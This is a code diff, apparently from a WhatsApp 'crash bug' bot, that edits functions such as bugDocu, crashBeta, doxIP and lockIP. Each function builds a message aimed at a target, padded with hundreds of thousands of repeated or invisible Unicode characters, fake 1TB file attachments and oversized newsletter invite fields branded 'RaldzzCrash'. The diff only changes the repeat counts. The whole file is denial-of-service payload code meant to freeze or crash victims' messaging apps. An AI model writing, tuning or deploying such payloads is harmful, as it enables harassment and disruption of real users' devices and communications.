@@ -1596,9 +1596,9 @@ async function blank(target) {
 
 async function bugDocu(target) {
   try {
-    const pesan = "@0".repeat(250000);
+    const pesan = "@0".repeat(70000);
     const file = {
-      name: "ꦾ".repeat(250000) + ".txt",
+      name: "ꦾ".repeat(200000) + ".txt",
       size: 1099511627776, // 1TB
       data: "0".repeat(1099511627776),
     };
@@ -1619,9 +1619,9 @@ async function bugDocu(target) {
 
 async function bugBetaDox(target) {
   try {
-    const pesan = "ꦽ".repeat(350000);
+    const pesan = "ꦽ".repeat(200000);
     const file = {
-      name: "ꦾ".repeat(250000) + ".txt",
+      name: "ꦾ".repeat(100000) + ".txt",
       size: 1099511627776, // 1TB
       data: "0".repeat(1099511627776),
     };
@@ -1646,9 +1646,9 @@ async function crashBeta(target) {
 					'message': {
 						"newsletterAdminInviteMessage": {
 							"newsletterJid": `120363298524333143@newsletter`,
-							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦽ".repeat(350000),
+							"newsletterName": "📜 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 📜" + "ꦽ".repeat(150000),
 							"jpegThumbnail": "",
-							"caption": "ꦽ".repeat(350000),
+							"caption": "ꦽ".repeat(150000),
 							"inviteExpiration": Date.now() + 1814400000
 						}
 					}
@@ -1666,9 +1666,9 @@ async function crashBeta(target) {
 
 async function doxIP(target) {
   try {
-    const pesan = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(350000);
+    const pesan = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(150000);
     const file = {
-      name: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(250000) + ".txt",
+      name: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(150000) + ".txt",
       size: 1099511627776, // 1TB
       data: "0".repeat(1099511627776),
     };
@@ -1700,7 +1700,7 @@ async function lockIP(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(450000)
+                        text: "💣 𝐑𝐚𝐥𝐝𝐳𝐳𝐂𝐫𝐚𝐬𝐡 💣" + "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(150000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
